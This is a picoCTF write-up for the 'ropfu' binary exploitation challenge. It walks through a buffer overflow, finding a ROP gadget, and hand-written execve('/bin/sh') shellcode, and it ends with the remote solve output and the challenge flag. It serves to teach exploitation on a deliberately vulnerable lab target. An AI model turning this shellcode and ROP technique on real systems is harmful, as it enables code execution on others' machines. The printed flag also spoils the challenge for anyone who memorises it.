# ropfu

ROP to asm shellcode, Syscall

## checksec

```bash
[*] '/mnt/d/CTFs/picoCTF/Pwn/ropfu/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x8048000)
    Stack:    Executable
    RWX:      Has RWX segments
```

PIE is not enabled, so our ROP chain does not change per runtime. 

The canary is not present in the `vuln` function. 

We can return to our own shellcode in our input buffer because the stack is executable. 

## Resources for making syscalls with x86 (32-bit) asm opcodes

- [Passing parameters to x86 syscalls](https://en.wikibooks.org/wiki/X86_Assembly/Interfacing_with_Linux)
- [x86 Syscall Reference](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86-32_bit)
- [x86 Opcode Reference](http://ref.x86asm.net/coder32.html)
- [Online x86 Assembler](https://defuse.ca/online-x86-assembler.htm)

## Concept

The concept of the exploit is to exploit the buffer overflow in  `vuln` to use a ROP gadget to jump to shellcode on the stack (written in the buffer) that starts a shell. 

The shellcode sets up the required registers to perform a syscall to `execve` with the first argument being "/bin/sh". 

## How to ROP to Shellcode?

Due to ASLR of the stack, we are unable to overwrite the return address with a static value (which would've been the start address of the buffer). 

Thankfully, the address of `buf` gets returned (i.e. stored in `eax`)

```c
void vuln() {
  char buf[16];
  printf("How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!\n");
  return gets(buf);
}
```

We can thus use a single ROP gadget to push `eax` onto the stack such that on ret, that value is loaded into `eip`. 

### ROP chain

- Gadget 1: Push eax
- Value 1: 11

Value 1 exists because we are popping `eax` off the stack to set it to our desired value (of 11). See [API requirements for `execve('/bin/sh)`](#api-requirements-for-execvebinsh). 

Gadget can be found with `xgadget`

```bash
(Linux_Pwn_Venv) asdiml@DESKTOP-XXXXXX:/mnt/d/CTFs/picoCTF/Pwn/ropfu$ xgadget vuln | grep 'push eax; ret'
0x000000080b06d7: add al, 0x8b; inc eax; push eax; ret;
0x000000080b06d9: inc eax; push eax; ret;
0x000000080b06da: push eax; ret;
```

## API Requirements for `execve('/bin/sh')`

Based on [this reference about passing parameters to x86 syscalls](https://en.wikibooks.org/wiki/X86_Assembly/Interfacing_with_Linux), [this x86 Syscall Reference](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86-32_bit) and [this StackOverflow post](https://stackoverflow.com/questions/36673765/why-can-the-execve-system-call-run-bin-sh-without-any-argv-arguments-but-not), we need

1. `eax` = 11, 
2. `ebx` to contain a pointer to a `/bin/sh` string, 
3. `ecx` to contain a null pointer, and 
4. `edx` to contain a null pointer. 

Note that `execve` technically requires `ecx` and `edx` to both point to arrays of char pointers, as [documented](https://man7.org/linux/man-pages/man2/execve.2.html), but the exploit works so it seems to be that `execve` can run /bin/sh even with those arguments as null pointers (probably due to checks in the source of `execve`). 

### Acceptance of Arbitrary `edx`

In fact, even if `edx` is not set, the exploit still runs. This is corroborated by [this writeup](https://nickcano.com/csaw-shell-p-code/), albeit of a different shellcode exploit but one that still involves running `execve("/bin/sh")`. 

## Shellcode

```x86asm
0:  58                  pop    eax
1:  89 e3               mov    ebx,esp
3:  83 eb 10            sub    ebx,0x10  ; Load /bin/sh -> ebx
6:  31 C9               xor    ecx,ecx
8:  31 D2               xor    edx,edx
a:  CD 80               int    80h
```

We can figure out that our injected "/bin/sh" string is at `esp-16` at that point with some poking around in gdb. 

Shellcode can be generated from an [online x86 assembler](https://defuse.ca/online-x86-assembler.htm#disassembly). Alternatively, you can look into an [x86 Opcode Reference](http://ref.x86asm.net/coder32.html). These are both mentioned in the [resources](#resources-for-making-syscalls-with-x86-32-bit-asm-opcodes) section. 

## Flag

```
[+] Opening connection to saturn.picoctf.net on port 60525: Done
[*] Loaded 77 cached gadgets for './vuln'
0x0000:        0x80b06da
[*] Switching to interactive mode
$ cat flag.txt
picoCTF{5n47ch_7h3_5h311_4c812975}
```

## Automation

The assembled `pwnlib.shellcraft.i386.linux.sh()` payload is 44 bytes long while we only have 28 bytes before the retaddr, so there was a need to use 

```
pwnlib.shellcraft.i386.linux.syscalls.execve('/bin/sh', 0, 0)
```

which is exactly 28 bytes long (when assembled). However, this is still causes problems because pushes onto the stack (to place b'/bin/sh\x00') overwrite instructions. 

> Specifically, `esp` pointed to the address 32 bytes above the start of the buffer. Thus with two pushes, we are already overwriting our shellcode. 

I personally felt that at this point the time spent attempting to automate the solve exceeded the amount of time that could possibly have been saved using automation, so I read [this writeup](https://medium.com/@valsamaramalamatenia/picoctf-ropfu-beginners-guide-eb7af08567b5). 

It turns out that we can just use a NOP slide and short jump to get `eip` past the return address portion of the payload before the shellcode (of basically any arbitrary size) to start a shell can start. 
